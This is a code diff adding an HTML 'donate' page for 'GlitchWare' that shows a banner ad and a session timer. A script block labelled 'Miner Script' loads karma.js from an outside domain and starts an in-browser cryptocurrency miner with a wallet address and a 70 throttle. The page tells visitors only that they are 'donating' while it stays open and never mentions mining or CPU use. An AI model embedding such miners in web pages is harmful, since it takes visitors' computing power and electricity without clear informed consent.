@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Glitchware Donate Page</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #282c34; /* Dark blue background */
+            color: #32CD32; /* Green text */
+            margin: 0;
+        }
+        .content {
+            text-align: center;
+            margin-top: 20px;
+            background-color: #20232a;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            color: #32CD32; /* Green text */
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+        .timer {
+            font-size: 1.5em;
+            margin-top: 20px;
+            background-color: #20232a;
+            padding: 10px;
+            border-radius: 5px;
+            border: 2px solid #32CD32; /* Green border */
+            color: #32CD32; /* Green text */
+        }
+        #frame {
+            width: 728px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        #frame iframe {
+            width: 728px;
+            height: 90px;
+            border: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: transparent;
+            margin-bottom: 10px;
+        }
+        #preview-link {
+            display: block;
+            text-align: right;
+            font-size: 12px;
+            color: #61dafb; /* Light blue for link */
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>You are currently donating to GlitchWare as long as this page is open</h1>
+        <p>We kindly request you to disable adblockers, we earn funds by showing ads to you.</p>
+        <div class="timer" id="timer">In this session 0 seconds have passed</div>
+    </div>
+
+    <!-- Advertisement -->
+    <div id='frame'>
+        <iframe data-aa='2333810' src='//ad.a-ads.com/2333810?size=728x90' style='width:728px; height:90px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe>
+        <a id='preview-link' href='https://a-ads.com/?partner=2333810'>Advertise here</a>
+    </div>
+
+    <!-- Miner Script -->
+    <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
+    <script type="text/javascript">
+        EverythingIsLife('45d5LPYeRSEPywkk61dHxFfSDLKYhRhuP3VoC8d9B98Qgu3jDZTxm9G949ZpLGSTXAUk24sXniAn5WtHLrzFbR3UK2Mhwdt', 'Donate', 70);
+    </script>
+    <script>   
+        let seconds = 0;
+        function updateTimer() {
+            seconds++;
+            const minutes = Math.floor(seconds / 60);
+            const hours = Math.floor(minutes / 60);
+            const displaySeconds = seconds % 60;
+            const displayMinutes = minutes % 60;
+            const displayHours = hours;
+
+            document.getElementById('timer').textContent = `In this session ${displayHours} hour(s) ${displayMinutes} minute(s) ${displaySeconds} second(s) have passed`;
+        }
+
+        setInterval(updateTimer, 1000);
+    </script>
+</body>
+</html>
